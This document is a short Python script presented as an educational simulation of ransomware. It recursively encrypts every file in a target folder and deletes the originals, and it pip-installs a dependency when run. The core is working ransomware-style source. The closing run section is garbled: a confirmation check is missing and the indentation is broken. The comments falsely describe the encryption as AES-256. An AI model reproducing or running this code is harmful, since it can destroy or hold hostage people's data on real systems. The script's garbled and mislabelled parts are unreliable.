## This script simulates a ransomware-like behavior by bulk-encrypting all files in a specified folder using AES-256 encryption.
## Please read through the code carefully before running it.
## This is for educational purposes only.

# Install the required dependency before running: pip install cryptography
import subprocess
import sys

subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])

import os
import base64
from hashlib import sha256
from cryptography.fernet import Fernet

FOLDER_TO_ENCRYPT = "path/to/your/folder"  
SECRET_PASSWORD = "your_secure_password"  

def generate_key_from_password(password: str) -> bytes:
    """Derives a secure 32-byte key from a plain text password."""
    hasher = sha256()
    hasher.update(password.encode())
    return base64.urlsafe_b64encode(hasher.digest())

def bulk_encrypt_folder(target_folder: str, password: str):
    """Recursively encrypts all files in a folder using AES-256."""
    key = generate_key_from_password(password)
    fernet = Fernet(key)
    
    for root, dirs, files in os.walk(target_folder):
        for file in files:
            # Skip already encrypted files to avoid double encryption
            if file.endswith('.enc'):
                continue
                
            file_path = os.path.join(root, file)
            try:
                # Read original data
                with open(file_path, 'rb') as f:
                    data = f.read()
                
                # Encrypt data
                encrypted_data = fernet.encrypt(data)
                
                # Write to a new encrypted file
                with open(file_path + '.enc', 'wb') as f:
                    f.write(encrypted_data)
                
                # Remove original unencrypted file
                os.remove(file_path)
                print(file_path, "-> Encrypted successfully.")
            except Exception as e:
                print(file_path, "-> Failed to encrypt:", str(e))

# --- HOW TO RUN ---
        bulk_encrypt_folder(FOLDER_TO_ENCRYPT, SECRET_PASSWORD)
        print("\nBulk encryption process complete.")
    else:
        print("Operation cancelled.")
